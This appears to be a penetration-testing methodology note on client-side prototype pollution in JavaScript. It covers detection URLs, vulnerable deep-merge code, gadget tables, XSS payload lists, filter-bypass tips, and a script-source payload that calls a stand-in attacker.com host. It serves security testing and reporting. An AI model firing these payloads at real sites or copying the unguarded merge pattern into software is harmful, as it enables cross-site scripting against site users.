# Client-Side Prototype Pollution

## Overview
Client-side prototype pollution occurs when an attacker can inject properties into JavaScript's `Object.prototype` (or other built-in prototypes) through user-controllable input. Since all JavaScript objects inherit from `Object.prototype`, a polluted property becomes available on every object in the application — enabling DOM XSS, property injection, and security control bypass.

## When This Happens

You should test for client-side prototype pollution when:

- The application uses JavaScript libraries that perform deep merge, extend, or clone operations on user-controlled objects (URL parameters, JSON bodies, postMessage data).
- You see URL hash fragments or query parameters being parsed into objects.
- The application uses libraries known to be vulnerable (older versions of Lodash, jQuery, etc.).
- Client-side JavaScript reads nested properties from URLs or user input.

## Recon / Detection

### 1. Quick prototype pollution test via URL

Add a pollution payload to the URL and check if it sticks:

```
https://target.com/?__proto__[testprop]=polluted
https://target.com/?__proto__.testprop=polluted
https://target.com/#__proto__[testprop]=polluted
```

Then open browser DevTools console:
```javascript
console.log({}.testprop); // If "polluted" → vulnerable
```

### 2. Alternative injection vectors

```
?constructor[prototype][testprop]=polluted
?constructor.prototype.testprop=polluted
```

Some parsers block `__proto__` but allow `constructor.prototype`.

### 3. Identify vulnerable code patterns

Look in JavaScript source for:
```javascript
// Deep merge without prototype check
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// URL parameter parsing into objects
const params = new URLSearchParams(location.search);
// or custom parsers that support nested keys
```

### 4. Automated scanning
- **DOM Invader** (Burp Suite built-in): Automatically tests for prototype pollution sources and gadgets.
- **PPScan**: Browser extension for prototype pollution detection.

## Exploitation Steps

### 1. Find a source (pollution entry point)

Common sources:
- URL query parameters parsed by custom or library code
- URL hash fragments
- `postMessage` data
- JSON input fields
- `document.cookie` values parsed into objects

### 2. Find a gadget (code that uses the polluted property)

A gadget is existing application code that reads a property from an object, and that property does not exist on the object itself — so it falls through to `Object.prototype` where your polluted value lives.

**Common gadgets for DOM XSS:**

| Property | Gadget pattern | Effect |
|----------|---------------|--------|
| `innerHTML` | `element.innerHTML = config.template` | HTML injection |
| `src` | `script.src = options.scriptUrl` | Script loading |
| `href` | `a.href = settings.url` | Navigation |
| `onload` | `img.onload = config.callback` | Event handler |
| `srcdoc` | `iframe.srcdoc = opts.content` | Iframe injection |
| `data-*` | `el.dataset.action` | Data attribute control |

### 3. Chain source + gadget for XSS

**Example: innerHTML gadget**
```
https://target.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

If somewhere in the code:
```javascript
element.innerHTML = config.someProperty || '';
// config.someProperty is undefined → falls to Object.prototype.innerHTML
```

**Example: Script source gadget**
```
https://target.com/?__proto__[transport_url]=data:,alert(1)//
```

If the application dynamically creates scripts:
```javascript
var script = document.createElement('script');
script.src = config.transport_url; // pollution controls the src
```

### 4. Bypass common defenses

- **Key sanitization**: If `__proto__` is blocked, try `constructor.prototype`
- **Value sanitization**: URL-encode payloads, use alternative XSS vectors
- **Object.create(null)**: Objects created this way have no prototype — cannot be polluted
- **Object.freeze(Object.prototype)**: Prevents mutation — but must be applied before pollution

## Example Payloads

```
# Basic pollution test
?__proto__[test]=polluted
?constructor[prototype][test]=polluted

# DOM XSS via innerHTML gadget
?__proto__[innerHTML]=<img/src=x onerror=alert(document.domain)>

# Script source injection
?__proto__[src]=data:,alert(1)//
?__proto__[transport_url]=//attacker.com/xss.js

# Event handler injection
?__proto__[onload]=alert(1)
?__proto__[onclick]=alert(1)

# Sequence property pollution
?__proto__[sequence]=<img/src=x onerror=alert(1)>

# Hash-based pollution
#__proto__[test]=polluted
```

## Tools

- **DOM Invader (Burp)**: Best automated tool — finds both sources and gadgets.
- **Browser DevTools**: Console for testing `{}.pollutedProp`, Sources for finding gadgets.
- **PPScan**: Browser extension for pollution detection.
- **Burp Active Scan**: Some prototype pollution checks built in.

## Real-World Notes

- Client-side prototype pollution is a **source + gadget** vulnerability: finding only the source (ability to pollute) is low-severity; finding a working gadget chain to XSS is what makes it critical.
- Many JavaScript libraries have known prototype pollution vulnerabilities — check the library version and search for CVEs.
- `DOM Invader` in Burp is the most efficient way to find both sources and gadgets automatically.
- When reporting, always provide: the exact URL with payload, which property was polluted, which gadget consumed it, and the resulting impact (typically DOM XSS).

## References

- `techniques/prototype-pollution-server-side.md`
- `techniques/xss-techniques.md`
- `methodology/javascript-endpoint-discovery.md`
- `tools/recon-tools.md`
